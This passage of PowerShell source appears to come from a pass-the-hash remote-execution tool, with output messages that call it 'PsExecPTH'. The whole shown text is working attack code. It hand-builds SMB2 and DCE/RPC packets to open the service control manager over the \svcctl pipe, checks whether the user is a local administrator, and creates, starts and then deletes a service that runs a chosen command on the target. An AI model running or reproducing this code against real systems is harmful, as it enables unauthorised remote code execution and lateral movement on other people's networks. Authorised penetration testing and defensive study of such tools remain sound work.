                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2TreeConnectRequest $SMB_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'CreateRequest'
                    }
                  
                    'CreateRequest'
                    {
                        $SMB2_tree_ID = 0x01,0x00,0x00,0x00
                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                        $SMB2_message_ID += 1
                        $packet_SMB2_header = Get-PacketSMB2Header 0x05,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                        $packet_SMB2_data["SMB2CreateRequestFile_Share_Access"] = 0x07,0x00,0x00,0x00  
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'DCERPCBind'
                    }
                
                    'DCERPCBind'
                    {
                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                        $SMB_file_ID = $SMB_client_receive[132..147]
                        $SMB2_message_ID += 1
                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID
                        $packet_SMB2_data["SMB2WriteRequest_Length"] = 0x48,0x00,0x00,0x00
                        $packet_DCERPC_data = Get-PacketDCERPCBind $SMB_named_pipe_UUID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                        $DCERPC_data_length = $SMB2_data.Length + $DCERPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $DCERPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $DCERPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $DCERPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'OpenSCManagerW'
                    }
               
                    'ReadRequest'
                    {
                        Start-Sleep -m 100   
                        $SMB2_message_ID += 1
                        $packet_SMB2_header = Get-PacketSMB2Header 0x08,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                        $packet_SMB2_header["SMB2Header_CreditCharge"] = 0x10,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2ReadRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = $SMB_client_stage_next
                    }
                
                    'OpenSCManagerW'
                    {
                        $SMB2_message_ID = 30
                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SCM_data = Get-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $SCM_data.length
                        $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length 
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                        $DCERPC_data_length = $SMB2_data.Length + $SCM_data.Length + $DCERPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $DCERPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'CreateServiceW'           
                    }
                
                    'CreateServiceW'
                    {

                        if([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {
                            Write-Output "$output_username is a local administrator on $Target"
                            $SMB_service_manager_context_handle = $SMB_client_receive[108..127]
                            $SMB2_message_ID += 20
                            $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                            $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SCM_data = Get-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $PsExec_command_bytes $PsExec_command_length_bytes
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $SCM_data.length
                            $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
                            $packet_DCERPC_data["DCERPCRequest_Opnum"] = 0x0c,0x00
                            $packet_DCERPC_data["DCERPCRequest_CallID"] = 0x02,0x00,0x00,0x00  
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                            $DCERPC_data_length = $SMB2_data.Length + $SCM_data.Length + $DCERPC_data.Length
                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $DCERPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadRequest'
                            $SMB_client_stage_next = 'StartServiceW'  
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '05-00-00-00')
                        {
                            Write-Output "$output_username is not a local administrator on $Target"
                            $PsExec_failed = $true
                        }
                        else
                        {
                            $PsExec_failed = $true
                        }
                     
                    }

                    'StartServiceW'
                    {
                    
                        if([System.BitConverter]::ToString($SMB_client_receive[112..115]) -eq '00-00-00-00')
                        {
                            Write-Output "PsExecPTH service $SMB_service created on $Target"
                            $SMB_service_context_handle = $SMB_client_receive[112..131]
                            $SMB2_message_ID += 20
                            $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                            $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SCM_data = Get-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $SCM_data.length
                            $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
                            $packet_DCERPC_data["DCERPCRequest_Opnum"] = 0x13,0x00
                            $packet_DCERPC_data["DCERPCRequest_CallID"] = 0x03,0x00,0x00,0x00  
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                            $DCERPC_data_length = $SMB2_data.Length + $SCM_data.Length + $DCERPC_data.Length
                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $DCERPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
                            Write-Output "Trying to execute command on $Target"
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadRequest'
                            $SMB_client_stage_next = 'DeleteServiceW'     
                        }
                        else
                        {
                            $SMB_execute_error_message = "Service creation fault context mismatch"
                            $PsExec_failed = $true
                        }
 
                    }
                
                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {

                            if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '1d-04-00-00')
                            {
                                Write-Output "PsExecPTH command executed on $Target"
                            }
                            elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '02-00-00-00')
                            {
                                Write-Output "PsExecPTH service $SMB_service failed to start on $Target"
                            }

                            $SMB2_message_ID += 20
                            $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                            $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00
                            }

                            $packet_SCM_data = Get-PacketSCMDeleteServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $SCM_data.length
                            $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
                            $packet_DCERPC_data["DCERPCRequest_Opnum"] = 0x02,0x00
                            $packet_DCERPC_data["DCERPCRequest_CallID"] = 0x04,0x00,0x00,0x00
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                            $DCERPC_data_length = $SMB2_data.Length + $SCM_data.Length + $DCERPC_data.Length
                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $DCERPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadRequest'
                            $SMB_client_stage_next = 'CloseServiceHandle'
                            $SMB_close_service_handle_stage = 1

                        }
                        else # handle status pending
                        {
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'DeleteServiceW'
                        }

                    }

                    'CloseServiceHandle'
                    {
                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            Write-Output "PsExecPTH service $SMB_service deleted on $Target"
                            $SMB2_message_ID += 20
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $SMB2_message_ID += 1
                            $SMB_client_stage = 'CloseRequest'
                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }

                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $SCM_data.length
                        $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
                        $packet_DCERPC_data["DCERPCRequest_Opnum"] = 0x00,0x00
                        $packet_DCERPC_data["DCERPCRequest_CallID"] = 0x05,0x00,0x00,0x00  
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
                        $DCERPC_data_length = $SMB2_data.Length + $SCM_data.Length + $DCERPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $DCERPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }

                    'CloseRequest'
                    {
                        $SMB2_message_ID += 20
                        $packet_SMB2_header = Get-PacketSMB2Header 0x06,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }
      
                        $packet_SMB2_data = Get-PacketSMB2CloseRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'TreeDisconnect'
                    }

                    'TreeDisconnect'
                    {
                        $SMB2_message_ID += 1
                        $packet_SMB2_header = Get-PacketSMB2Header 0x04,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }
          
                        $packet_SMB2_data = Get-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Logoff'
                    }

                    'Logoff'
                    {
                        $SMB2_message_ID += 20
                        $packet_SMB2_header = Get-PacketSMB2Header 0x02,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }
         
                        $packet_SMB2_data = Get-PacketSMB2SessionLogoffRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Exit'
                    }

                }
                
                if($PsExec_failed)
                {
                    Write-Output "PsExecPTH failed on $Target"
                    BREAK SMB_execute_loop
                }
            
            }

        }

    }

    $SMB_client.Close()
}

}